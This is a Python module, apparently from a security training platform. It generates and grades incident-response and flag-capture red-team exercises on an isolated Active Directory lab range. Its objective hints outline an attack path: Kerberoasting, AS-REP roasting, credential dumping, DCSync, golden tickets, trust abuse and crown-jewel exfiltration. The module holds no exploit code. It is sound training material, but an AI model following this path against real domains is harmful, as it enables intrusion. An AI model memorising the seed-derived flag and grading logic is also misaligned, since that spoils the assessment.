    steps = [(vtid, vet, pz, _b4_acct(u1),
              vtmpl.format(tok=_b3_tok(r, 5), H=pz, U=u1, d=r.randint(2, 250)), False)]
    for (tid, et, host_role, acct_role, tmpl, is_persist) in chain:
        host = _hosts.get(host_role)
        if host is None:               # a `third`-host step with no third host in this incident
            continue
        acct = _b4_acct(_accts.get(acct_role, u1))
        detail = tmpl.format(tok=_b3_tok(r, 5), **fmt)
        steps.append((tid, et, host, acct, detail, is_persist))

    affected_hosts = sorted({pz, dst} | ({third} if third else set()))
    affected_accounts = sorted({_b4_acct(u1), _b4_acct(u2)})

    events = []
    order_ids = []
    persist_ids = []
    t = 0
    for i, (tid, et, host, acct, detail, is_persist) in enumerate(steps):
        t += r.randint(2, 40)
        ts = base + _dt.timedelta(minutes=t)
        eid = "EVT-%04d" % (4000 + i)
        events.append({"id": eid, "_ts": ts, "host": host, "user": acct,
                       "event_type": et, "detail": detail,
                       "_key": {"incident": True, "order": i, "technique": tid,
                                "persistence": is_persist}})
        order_ids.append((ts, eid))
        if is_persist:
            persist_ids.append(eid)

    # benign noise spread across the estate and the whole day
    benign_n = r.randint(26, 38)
    for j in range(benign_n):
        et, tmpl = r.choice(_B2_BENIGN)
        bu, bh = r.choice(_B4_USERS), r.choice(_B4_HOSTS)
        bdst = r.choice([h for h in _B4_HOSTS if h != bh])
        ts = base + _dt.timedelta(minutes=r.randint(0, 1440))
        events.append({"id": "EVT-%04d" % (4100 + j), "_ts": ts, "host": bh,
                       "user": _b4_acct(bu), "event_type": et,
                       "detail": tmpl.format(U=bu, H=bh, dst=bdst),
                       "_key": {"incident": False}})

    r.shuffle(events)
    for e in events:
        e["timestamp"] = e.pop("_ts").isoformat()

    incident_order = [eid for _, eid in sorted(order_ids)]
    return {"board": 4, "cohort_theme": "corp.local",
            "truth": {"patient_zero": pz, "initial_access": vtid,
                      "affected_hosts": affected_hosts, "affected_accounts": affected_accounts,
                      "timeline": incident_order, "persistence": persist_ids},
            "alerts": events}


def public_board4(scenario):
    """The evidence: forensic events across the estate, incident labels stripped."""
    return {"board": 4, "theme": scenario["cohort_theme"],
            "alerts": [{"id": a["id"], "timestamp": a["timestamp"], "host": a["host"],
                        "user": a["user"], "event_type": a["event_type"],
                        "detail": a["detail"]} for a in scenario["alerts"]]}


def _b4_norm_host(h):
    return _norm(h)


def _b4_norm_acct(a):
    a = _norm(a)
    return a.split("\\")[-1] if "\\" in a else a


def _set_f1(submitted, truth, normfn):
    sub = {normfn(x) for x in (submitted or []) if str(x).strip()}
    tru = {normfn(x) for x in truth}
    if not tru:
        return 1.0 if not sub else 0.0
    tp = len(sub & tru)
    prec = tp / len(sub) if sub else 0.0
    rec = tp / len(tru)
    return (2 * prec * rec / (prec + rec)) if (prec + rec) else 0.0


def _order_score(submitted_ids, truth_order):
    """Fraction of adjacent pairs in the submitted timeline that are in the
    correct relative order per the truth, counting only ids that are real
    incident events. Rewards a correctly sequenced chain."""
    rank = {eid: i for i, eid in enumerate(truth_order)}
    seq = [rank[str(e).strip()] for e in (submitted_ids or []) if str(e).strip() in rank]
    if len(seq) < 2:
        return 1.0 if len(seq) == 1 else 0.0
    good = sum(1 for a, b in zip(seq, seq[1:]) if a < b)
    return good / (len(seq) - 1)


def score_board4(scenario, submission):
    """Grade the IR report against the incident ground truth. Feedback is
    per-section correctness, never the answer."""
    t = scenario["truth"]
    s = submission if isinstance(submission, dict) else {}

    pz_ok = _b4_norm_host(s.get("patient_zero")) == _b4_norm_host(t["patient_zero"])
    ia_ok = _norm(s.get("initial_access")) == _norm(t["initial_access"])
    hosts_f1 = _set_f1(s.get("affected_hosts"), t["affected_hosts"], _b4_norm_host)
    accts_f1 = _set_f1(s.get("affected_accounts"), t["affected_accounts"], _b4_norm_acct)
    persist_f1 = _set_f1(s.get("persistence"), t["persistence"], _norm)

    tl = [str(x).strip() for x in (s.get("timeline") or [])]
    tl_membership = _set_f1(tl, t["timeline"], _norm)
    tl_order = _order_score(tl, t["timeline"])
    timeline_score = 0.6 * tl_membership + 0.4 * tl_order

    weights = {"patient_zero": 0.15, "initial_access": 0.15, "affected_hosts": 0.15,
               "affected_accounts": 0.15, "timeline": 0.25, "persistence": 0.15}
    earned = (weights["patient_zero"] * (1.0 if pz_ok else 0.0)
              + weights["initial_access"] * (1.0 if ia_ok else 0.0)
              + weights["affected_hosts"] * hosts_f1
              + weights["affected_accounts"] * accts_f1
              + weights["timeline"] * timeline_score
              + weights["persistence"] * persist_f1)
    score = round(100.0 * earned, 1)

    feedback = {
        "patient_zero_correct": pz_ok,
        "initial_access_correct": ia_ok,
        "affected_hosts_f1": round(hosts_f1, 2),
        "affected_accounts_f1": round(accts_f1, 2),
        "timeline_membership_f1": round(tl_membership, 2),
        "timeline_order_score": round(tl_order, 2),
        "persistence_f1": round(persist_f1, 2),
    }
    return score, [feedback]


# --- board 5: red team on GOAD (flag capture) -------------------------------
# The first live-range board. The ranger attacks their own isolated Game of
# Active Directory range over WireGuard. Proof is not a submitted analysis but
# CAPTURED FLAGS: per-seed, high-entropy tokens planted at locations reachable
# only by completing each objective. The server re-derives the expected flags
# from the seed (board5_flags), so a correct flag IS proof of the action; flags
# are unique per ranger (useless to share) and cannot be guessed. The same
# board5_flags() feeds the range provisioner, which plants them at deploy time.
_B5_DOMAIN = "sevenkingdoms.local"
_B5_DCS = ["kingslanding", "winterfell", "braavos"]
_B5_SERVERS = ["castelblack", "meereen"]
_B5_SVC_ACCTS = ["sql_svc", "http_svc", "backup_svc", "web_svc"]
_B5_ASREP_USERS = ["brandon.stark", "missandei", "jon.snow", "samwell.tarly"]

# Objectives: fixed GOAD attack path, points sum to 100. Target host/account are
# seed-flavored in the brief; the flag value is derived from seed + id.
_B5_OBJECTIVES = [
    ("recon", "Enumerate the domain", "T1087 / T1046",
     "Null or guest SMB/LDAP enumeration of {domain}. The flag sits on a world-readable share.", 5),
    ("foothold", "Establish a foothold", "T1110 / T1078",
     "Spray or guess a weak credential and land a session. The flag is in the user's profile.", 10),
    ("asreproast", "AS-REP roast a pre-auth-disabled user", "T1558.004",
     "Roast {asrep_user} (no Kerberos pre-auth), crack it offline. The flag unlocks with that user.", 12),
    ("kerberoast", "Kerberoast a service account", "T1558.003",
     "Request the SPN ticket for {svc}, crack it. The flag is on a share only {svc} can read.", 15),
    ("lateral", "Move laterally to a server", "T1021",
     "Pivot to {lateral_host} (WinRM/SMB/PsExec). The flag is on that host.", 13),
    ("credaccess", "Dump credentials", "T1003",
     "Dump LSASS or the SAM on a compromised host. The flag is readable only by SYSTEM/local admin.", 13),
    ("aclabuse", "Abuse a dangerous ACL", "T1222 / T1484",
     "Find and abuse a GenericAll/WriteDACL edge to escalate. The flag is the proof of the takeover.", 12),
    ("domainadmin", "Become Domain Admin", "T1078.002",
     "Reach Domain Admin on {domain}. The flag is on the Administrator desktop of a DC.", 10),
    ("dcsync", "DCSync the krbtgt", "T1003.006",
     "DCSync to pull the krbtgt hash. The flag is derived from the directory's crown jewels.", 10),
]


# Flag-capture boards (5 and 6) share one mechanism, parameterized by the
# board's objective list. The flag is a per-seed, per-board token so it proves
# the action, is unique to the ranger, and never transfers across boards.
_FLAG_OBJECTIVES = {}  # board -> objectives spec (filled as boards are defined)


def _flags_for(board, seed):
    out = {}
    for oid, *_ in _FLAG_OBJECTIVES.get(board, []):
        h = _hashlib.sha256(("board%d:%s:%s" % (board, seed, oid)).encode()).hexdigest()[:16]
        out[oid] = "QR%d{%s}" % (board, h)
    return out


def placement_vars(n, seed, gp=None):
    """STRATA S6 (section 17): the PINNED range-placement config the qwalora_flags Ansible role must
    use for this seed, so a flag's ACL lock references the SAME account the approved scenario names -
    never the role's fixed defaults. The brief randomizes the kerberoast service account and the
    AS-REP user per seed; if the role kept its fixed defaults it would lock a flag to a non-existent
    account and silently cost the ranger a point. It also pins the board number so a board-6 range
    gets the board-6 placement map (the role defaults to board 5). Keys match the role's var names
    (passed through broker templateVars). Returns None for non-flag boards."""
    if n == 5:
        t = generate_board5(seed, gp)["targets"]
        return {"qwalora_flags_board": 5,
                "qwalora_svc_account": t["kerberoast_account"],
                "qwalora_asrep_account": t["asrep_user"],
                "qwalora_dc_hostnames": list(_B5_DCS),
                "qwalora_domain": _B5_DOMAIN}
    if n == 6:
        generate_board6(seed, gp)  # deterministic; validates the seed resolves
        return {"qwalora_flags_board": 6,
                "qwalora_dc_hostnames": list(_B6_DCS),
                "qwalora_domain": _B6_PARENT}
    return None


def flags_for_board(n, seed):
    """The per-seed flag for each objective of a flag-capture board. Used by both
    the grader and the range provisioner (which plants these at deploy time), so
    they always agree."""
    return _flags_for(n, seed)


def board5_flags(seed):  # retained name; some callers reference it directly
    return _flags_for(5, seed)


def _public_flags(scenario):
    """The mission brief: objectives, targets, points. Flags are never sent."""
    return {"board": scenario["board"], "theme": scenario["cohort_theme"],
            "domain": scenario["targets"]["domain"], "targets": scenario["targets"],
            "total_points": sum(o["points"] for o in scenario["objectives"]),
            "objectives": scenario["objectives"]}


def _score_flags(scenario, submission):
    """Score captured flags against the seed-derived expected flags. Points-
    weighted; feedback is which objectives are captured, never the flag value."""
    expected = scenario["_flags"]
    by_id = {o["id"]: o for o in scenario["objectives"]}
    sub = submission.get("flags") if isinstance(submission, dict) else None
    if not isinstance(sub, dict):
        sub = {}
    total = sum(o["points"] for o in scenario["objectives"])
    earned = 0
    per_obj = []
    for oid, o in by_id.items():
        want = _norm(expected.get(oid))
        got = _norm(sub.get(oid))
        ok = bool(want) and got == want
        if ok:
            earned += o["points"]
        per_obj.append({"id": oid, "name": o["name"], "points": o["points"], "captured": ok})
    score = round(100.0 * earned / total, 1) if total else 0.0
    captured = sum(1 for p in per_obj if p["captured"])
    feedback = {"objectives_captured": "%d/%d" % (captured, len(per_obj)),
                "points": "%d/%d" % (earned, total), "objectives": per_obj}
    return score, [feedback]


_FLAG_OBJECTIVES[5] = _B5_OBJECTIVES


def generate_board5(seed, gp=None):
    """Board 5 (Raider) world. S6 section 14: when a family's gen_params is supplied the world varies
    MATERIALLY (which identities are roastable, which dangerous ACL edge is the escalation, which host
    is the pivot), not just which names a seed happens to pick. gp=None keeps the legacy single-world
    behaviour byte-for-byte (full account pools, generic edge) so the seed-only path is unchanged."""
    r = _random.Random("board5:" + str(seed))
    gp = gp or {}
    svc_pool = list(gp.get("svc_pool") or _B5_SVC_ACCTS)
    asrep_pool = list(gp.get("asrep_pool") or _B5_ASREP_USERS)
    lateral_pool = list(gp.get("lateral_pool") or _B5_SERVERS)
    edge = gp.get("escalation_edge")   # e.g. GenericAll | WriteDACL | ForceChangePassword
    svc = r.choice(svc_pool)
    asrep_user = r.choice(asrep_pool)
    lateral_host = r.choice(lateral_pool)
    fill = {"domain": _B5_DOMAIN, "svc": svc, "asrep_user": asrep_user, "lateral_host": lateral_host}
    objectives = []
    for (oid, name, tech, hint, pts) in _B5_OBJECTIVES:
        h = hint.format(**fill)
        if oid == "aclabuse" and edge:
            h = ("Find and abuse a %s edge to escalate privileges. The flag is the proof of the "
                 "takeover." % edge)
        objectives.append({"id": oid, "name": name, "technique": tech, "hint": h, "points": pts})
    return {"board": 5, "cohort_theme": _B5_DOMAIN,
            "targets": {"domain": _B5_DOMAIN, "dcs": _B5_DCS, "servers": _B5_SERVERS,
                        "kerberoast_account": svc, "asrep_user": asrep_user,
                        "lateral_host": lateral_host, "escalation_edge": edge},
            "objectives": objectives,
            "_flags": _flags_for(5, seed)}


def public_board5(scenario):
    return _public_flags(scenario)


def score_board5(scenario, submission):
    return _score_flags(scenario, submission)


# --- board 6: Vanguard capstone (full-forest GOAD) --------------------------
# The culmination. A harder, multi-domain estate: the sevenkingdoms.local
# forest (parent + north child) plus a trust to the essos.local forest. The
# ranger must own the whole forest and pivot across the trust, end to end. Same
# proof-of-action flag model as board 5, but the objectives escalate to child
# -> parent trust abuse, forest persistence, and cross-forest compromise.
_B6_PARENT = "sevenkingdoms.local"
_B6_CHILD = "north.sevenkingdoms.local"
_B6_FOREST2 = "essos.local"
_B6_DCS = ["kingslanding", "winterfell", "braavos"]
_B6_SERVERS = ["castelblack", "meereen"]
# Point weights interplay with the capstone rubric (§18): the final crown-jewel exfil is deliberately
# low-point but MANDATORY, so a candidate can accumulate >=95 points on the rest of the chain and still
# critically fail by never capturing the crown - the mandatory gate does real, independent work.
_B6_OBJECTIVES = [
    ("recon_forest", "Map the forest and its trusts", "T1482 / T1087",
     "Enumerate {parent}, {child}, and the trust to {forest2}. The flag is on a world-readable share.", 8),
    ("foothold", "Establish a foothold", "T1110 / T1078",
     "Land a session in {child}. The flag is in the user's profile.", 10),
    ("roast_forest", "Harvest service and AS-REP tickets", "T1558.003 / T1558.004",
     "Kerberoast and AS-REP roast across the forest, crack offline. The flag unlocks with a cracked account.", 12),
    ("child_da", "Become Domain Admin of the child", "T1078.002",
     "Reach Domain Admin on {child}. The flag is on the Administrator desktop of {child_dc}.", 12),
    ("trust_abuse", "Abuse the child to parent trust", "T1134.005 / T1484.002",
     "Forge an inter-realm ticket (SID history of {parent} Enterprise Admins) to cross the trust. The flag proves the crossing.", 12),
    ("parent_ea", "Seize Enterprise Admin", "T1078.002",
     "Take Enterprise Admin on {parent}. The flag is on {parent_dc}.", 12),
    ("forest_persist", "Establish forest persistence", "T1558.001 / T1003.006",
     "DCSync krbtgt and mint forest persistence (golden ticket). The flag derives from the krbtgt material.", 12),
    ("cross_forest", "Pivot across the forest trust", "T1482 / T1550",
     "Abuse the trust to {forest2} and land there. The flag is on a {forest2} host.", 10),
    ("forest2_da", "Compromise the second forest", "T1078.002",
     "Reach Domain Admin on {forest2}. The flag is on {forest2_dc}.", 8),
    ("crown", "Capture the crown jewels", "T1005 / T1020",
     "Exfiltrate the designated crown-jewel secret from the root DC. The flag is that secret.", 4),
]
_FLAG_OBJECTIVES[6] = _B6_OBJECTIVES

# --- Board 6 capstone rubric (S6 §18) ---------------------------------------
# Board 6 is the Vanguard CAPSTONE: an end-to-end, full-forest compromise. It is graded by a
# rubric DISTINCT from board 5 (which is a flat points-weighted sum). The capstone's defining
# achievement is demonstrating the whole kill chain, so a set of objectives is MANDATORY: these are
# the milestones that prove the candidate actually owned the estate end to end (becoming child DA,
# abusing the trust across domains, seizing the parent forest, establishing forest persistence,
# pivoting across the forest trust, and capturing the crown jewels). Missing ANY mandatory milestone
# is a CRITICAL FAILURE: the attempt cannot pass regardless of how many points of easier objectives
# were captured, so its score is capped below the 95 bar (OSCP-style must-complete gating). The
# rubric is VERSIONED so the exact rubric that graded an attempt is recorded and bindable.
CAPSTONE_RUBRIC_VERSION = "b6-capstone-v1"
_B6_MANDATORY = ("child_da", "trust_abuse", "parent_ea", "forest_persist", "cross_forest", "crown")
_CAPSTONE_FAIL_CEILING = 94.9  # strictly below PASS_BAR (95.0)


BOARD5_RUBRIC_VERSION = "b5-flat-v1"   # board 5 (Raider): flat points-weighted sum at the 95 bar


def rubric_version(board):
    """The versioned grading rubric id for a flag-capture board, bound into the attestation (§5).
    Board 6 uses the capstone rubric; board 5 uses the flat points-weighted sum."""
    return CAPSTONE_RUBRIC_VERSION if int(board) == 6 else BOARD5_RUBRIC_VERSION


def capstone_rubric():
    """The versioned Board 6 capstone rubric, candidate-safe (no flags). Describes the mandatory
    end-to-end milestones and the critical-failure rule, so it can be shown in the mission brief and
    bound into the assessment record."""
    return {
        "version": CAPSTONE_RUBRIC_VERSION,
        "board": 6,
        "kind": "capstone",
        "pass_bar": 95.0,
        "mandatory_objectives": list(_B6_MANDATORY),
        "rule": ("This is a capstone: every mandatory milestone must be demonstrated end to end. "
                 "Missing any mandatory objective is a critical failure and caps the score below the "
                 "pass bar, regardless of points earned on other objectives."),
    }


def score_capstone(scenario, submission):
    """Board 6 capstone scorer (§18). Starts from the points-weighted capture score, then applies the
    mandatory-milestone critical-failure gate: if any mandatory objective is uncaptured, the effective
    score is capped below the bar and the feedback names the missing milestones. Distinct from board 5
    and versioned."""
    score, feedback = _score_flags(scenario, submission)
    fb = feedback[0]
    captured_ids = {p["id"] for p in fb["objectives"] if p["captured"]}
    missing = [oid for oid in _B6_MANDATORY if oid not in captured_ids]
    fb["rubric_version"] = CAPSTONE_RUBRIC_VERSION
    fb["mandatory_objectives"] = list(_B6_MANDATORY)
    fb["mandatory_missing"] = missing
    fb["capstone_complete"] = not missing
    effective = score
    if missing:
        effective = min(score, _CAPSTONE_FAIL_CEILING)
        fb["critical_failure"] = ("capstone incomplete: mandatory end-to-end milestones not "
                                  "demonstrated (%s); score capped below the bar" % ", ".join(missing))
    return effective, feedback


def generate_board6(seed, gp=None):
    """Board 6 (Vanguard) multi-forest capstone. S6 section 14: a family's gen_params varies the
    MATERIAL structure (trust topology to cross, which DC holds the crown jewels, the escalation
    technique across the trust), so two families are genuinely different investigations rather than a
    reskin. gp=None keeps the legacy single-world behaviour unchanged."""
    r = _random.Random("board6:" + str(seed))
    gp = gp or {}
    child_dc = "winterfell"
    parent_dc = "kingslanding"
    forest2_dc = "braavos"
    forest2_pool = list(gp.get("forest2_host_pool") or _B6_SERVERS)
    forest2_host = r.choice(forest2_pool)
    trust_topology = gp.get("trust_topology")   # child-to-parent | cross-forest | bidirectional
    crown_location = gp.get("crown_location")    # parent-dc | forest2-dc | root-dc
    escalation = gp.get("escalation")            # SID-history | trust-key | golden-ticket
    fill = {"parent": _B6_PARENT, "child": _B6_CHILD, "forest2": _B6_FOREST2,
            "child_dc": child_dc, "parent_dc": parent_dc, "forest2_dc": forest2_dc}
    objectives = []
    for (oid, name, tech, hint, pts) in _B6_OBJECTIVES:
        h = hint.format(**fill)
        if oid == "trust_abuse" and escalation:
            h = ("Cross the %s trust using %s. The flag proves the crossing."
                 % (trust_topology or "domain", escalation))
        elif oid == "crown" and crown_location:
            h = ("Exfiltrate the designated crown-jewel secret from the %s. The flag is that secret."
                 % crown_location)
        objectives.append({"id": oid, "name": name, "technique": tech, "hint": h, "points": pts})
    return {"board": 6, "cohort_theme": _B6_PARENT,
            "targets": {"domain": _B6_PARENT, "parent": _B6_PARENT, "child": _B6_CHILD,
                        "forest2": _B6_FOREST2, "dcs": _B6_DCS, "servers": _B6_SERVERS,
                        "forest2_host": forest2_host, "trust_topology": trust_topology,
                        "crown_location": crown_location, "escalation": escalation},
            "objectives": objectives,
            "rubric": capstone_rubric(),
            "_flags": _flags_for(6, seed)}


def public_board6(scenario):
    pub = _public_flags(scenario)
    # The capstone rule (mandatory milestones + critical-failure gate) is part of the brief, not a
    # secret: surface the versioned rubric so the candidate knows the capstone must be completed
    # end to end. Still flag-free.
    pub["rubric"] = scenario.get("rubric") or capstone_rubric()
    return pub


def score_board6(scenario, submission):
    return score_capstone(scenario, submission)


# --- dispatch ---------------------------------------------------------------
_GENERATORS = {
    1: (generate_board1, public_board1, score_board1),
    2: (generate_board2, public_board2, score_board2),
    3: (generate_board3, public_board3, score_board3),
    4: (generate_board4, public_board4, score_board4),
    5: (generate_board5, public_board5, score_board5),
    6: (generate_board6, public_board6, score_board6),
}


# What kind of exercise each board is, so the lab client knows what file to
# scaffold and submit. "triage": per-event verdicts (triage.yml). "detection":
# a detection ruleset (rules.yml).
_KINDS = {1: "triage", 2: "triage", 3: "detection", 4: "ir", 5: "flags", 6: "flags"}


def has_board(n):
    return n in _GENERATORS


def kind(n):
    return _KINDS.get(n, "triage")


def dataset(n, seed):
    gen, pub, _ = _GENERATORS[n]
    return pub(gen(seed))


def grade(n, seed, submission):
    gen, _, scorer = _GENERATORS[n]
    return scorer(gen(seed), submission)


# --- board 1 ADVANCED: multi-step incident investigation --------------------
# Additive layer over Board-1 triage. Same answer-free contract: the key is derived from the seed
# on the server (generate_incident) and never leaves it; the public view is alerts only. Does NOT
# alter generate_board1/score_board1 or the 95% gate.
def incident_dataset(seed, variant=None):
    from siem import incident_investigation as _ii
    return _ii.public_incident(_ii.generate_incident(seed, variant))


def incident_grade(seed, submission, variant=None):
    from siem import incident_investigation as _ii
    sc = _ii.generate_incident(seed, variant)
    return _ii.score_incident(sc, submission)
